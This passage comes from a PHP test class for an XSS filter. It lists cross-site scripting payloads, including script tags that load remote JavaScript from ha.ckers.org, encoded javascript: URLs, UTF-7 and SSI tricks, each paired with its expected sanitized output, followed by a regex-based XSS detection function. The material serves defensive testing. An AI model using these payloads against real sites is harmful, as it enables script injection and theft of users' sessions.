            array( '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>', '' ),
            array( 'c="javascript:";', 'c=&quot;nojavascript...&quot;;' ),
            array( '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML>', '&lt;B&gt;' ),
            array( '<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>', '&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;' ),
            array( '<XML SRC="xsstest.xml" ID=I></XML>', '' ),
            array( '<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>', '&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;' ),
            array( '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>', '' ),
            array( '<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">', 'alert(&quot;XSS&quot;)&quot;&gt;' ),
            array( '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>', '' ),
            array( '<!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\'"-->', '' ),
            array( '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">', '' ),
            array( '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">', '' ),
            array( '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4-', ' +ADw-SCRIPT+AD4-alert(&#039;XSS&#039;);+ADw-/SCRIPT+AD4-' ),
            array( '<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '' ),
            array( '<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '' ),
            array( '<SCRIPT a=">" \'\' SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '' ),
            array( '<SCRIPT "a=\'>\'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '' ),
            array( '<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;' ),
            array( '<SCRIPT a=">\'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '' ),
            array( '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>', 'document.write(&quot;' ),
            array( '($_POST >"\'><script>alert(‘XSS\')</script>', '($_POST &gt;&quot;&#039;&gt;alert(‘XSS&#039;)' ),
            array( '$_POST >%22%27><img%20src%3d%22javascript:alert(%27XSS%27)%22>', '$_POST &gt;%22%27&gt;' ),
            array( '>"\'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>', '&gt;&quot;&#039;&gt;' ),
            array( 'AK%22%20style%3D%22background:url(javascript:alert(%27XSS%27))%22%20OS%22', 'AK%22%20style%3D%22background:url(%27XSS%27))%22%20OS%22' ),
            array( '%22%2Balert(%27XSS%27)%2B%22', '%22%2Balert(%27XSS%27)%2B%22' ),
            array( '<table background="javascript:alert(([code])"></table>', '' ),
            array( '<object type=text/html data="javascript:alert(([code]);"></object>', '' ),
            array( '<body onload="javascript:alert(([code])"></body>', '' )
        );
    }

    /**
     * Given a string, this function will determine if it potentially an
     * XSS attack and return boolean.
     *
     * @author https://github.com/symphonycms/xssfilter/blob/master/extension.driver.php
     *
     * @param string $string The string to run XSS detection logic on
     * @return boolean True if the given `$string` contains XSS, false otherwise.
     *
     */
    private function detectXSS( $string )
    {
        $contains_xss = false;

        // Skip any null or non string values
        if(is_null($string) || !is_string($string) ){
            return $contains_xss;
        }

        // Keep a copy of the original string before cleaning up
        $orig = $string;

        // URL decode
        $string = urldecode($string);

        // Convert Hexadecimals
        //$string = preg_replace('!(&#|\\\)[xX]([0-9a-fA-F]+);?!e','chr(hexdec("$2"))', $string);
        $string = preg_replace_callback(
            "!(&#|\\\)[xX]([0-9a-fA-F]+);?!",
            function($matches) {
                foreach($matches as $match) {
                    return chr(hexdec($match));
                }
            },
            $string
        );

        // Clean up entities
        $string = preg_replace('!(&#0+[0-9]+)!','$1;',$string);

        // Decode entities
        $string = html_entity_decode($string, ENT_NOQUOTES, 'UTF-8');

        // Strip whitespace characters
        $string = preg_replace('!\s!','',$string);

        // Fix &entity\n;
        $string = str_replace(array('&amp;','&lt;','&gt;'), array('&amp;amp;','&amp;lt;','&amp;gt;' ), $string);
        $string = preg_replace('/(&#*\w+)[\x00-\x20]+;/u', '$1;', $string);
        $string = preg_replace('/(&#x*[0-9A-F]+);*/iu', '$1;', $string);
        $string = html_entity_decode($string, ENT_COMPAT, 'UTF-8');

        // Set the patterns we'll test against
        $patterns = array(
            // Match any attribute starting with "on" or xmlns
            '#(<[^>]+[\x00-\x20\"\'\/])(on|xmlns)[^>]*>?#iUu',
            // Match javascript:, livescript:, vbscript: and mocha: protocols
            '!((java|live|vb)script|mocha|feed|data):(\w)*!iUu',
            '#-moz-binding[\x00-\x20]*:#u',
            // Match style attributes
            '#(<[^>]+[\x00-\x20\"\'\/])style=[^>]*>?#iUu',
            // Match unneeded tags
            '#</*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^>]*+>#i'
        );

        foreach($patterns as $pattern){
            // Test both the original string and clean string
            if( preg_match($pattern, $string) || preg_match($pattern, $orig)){
                $contains_xss = true;
            }
            if ($contains_xss === true){
                return true;
            }
        }
        return false;
    }
}